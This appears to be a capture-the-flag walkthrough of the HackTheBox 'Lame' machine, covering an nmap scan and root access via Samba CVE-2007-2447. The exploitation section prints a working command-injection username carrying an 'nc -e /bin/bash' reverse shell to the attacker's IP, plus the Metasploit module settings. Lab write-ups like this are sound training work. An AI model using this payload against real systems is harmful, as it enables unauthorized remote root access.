---
title: "HackTheBox: Lame Machine Walkthrough"
date: "2026-03-15"
category: "Pwn"
difficulty: "Easy"
platform: "HackTheBox"
os: "Linux"
ip: "10.10.10.3"
points: "20"
tags: ["HackTheBox", "Nmap", "Samba", "Linux"]
image: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=1000&auto=format&fit=crop"
summary: "Comprehensive walkthrough of Lame from HackTheBox. Demonstrating port scanning, Samba CVE-2007-2447 exploitation, and obtaining root flag."
---

# Executive Summary

**Lame** is a beginner-friendly Linux machine on HackTheBox. It is a classic target requiring basic network enumeration and exploiting a known vulnerability in **Samba 3.0.20 (`username map script`)**.

---

## 1. Reconnaissance & Enumeration

We start by running an initial **Nmap** scan against target IP `10.10.10.3` to discover open ports and running services.

```bash
nmap -sC -sV -oA nmap/lame 10.10.10.3
```

### Nmap Scan Results

```text
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
3632/tcp open  distcc      distccd v1
```

> [!NOTE]
> Key Findings:
> - FTP (`vsftpd 2.3.4`)
> - Samba (`smbd 3.0.20-Debian`) on TCP 139/445
> - Distcc daemon on TCP 3632

---

## 2. Exploitation (Samba CVE-2007-2447)

Samba version `3.0.20` is vulnerable to Remote Code Execution via shell command injection in the `username map script` configuration (`CVE-2007-2447`).

### Payload Crafting

When connecting via `smbclient`, specifying a username with backticks causes command execution on the target:

```bash
smbclient //10.10.10.3/tmp -U '/=`nohup nc -e /bin/bash 10.10.14.2 4444`'
```

Alternatively, using **Metasploit**:

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST 10.10.14.2
run
```

```text
[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Command shell session 1 opened (10.10.14.2:4444 -> 10.10.10.3:49158)

whoami
root
```

---

## 3. Capturing Flags

Since Samba executes commands directly as `root`, no privilege escalation is needed!

```bash
id
# uid=0(root) gid=0(root)

cat /home/makis/user.txt
# [USER FLAG CAPTURED]

cat /root/root.txt
# [ROOT FLAG CAPTURED]
```

> [!TIP]
> Always verify service versions during enumeration. Legacy services like `Samba 3.0.20` often contain pre-auth RCE vulnerabilities!
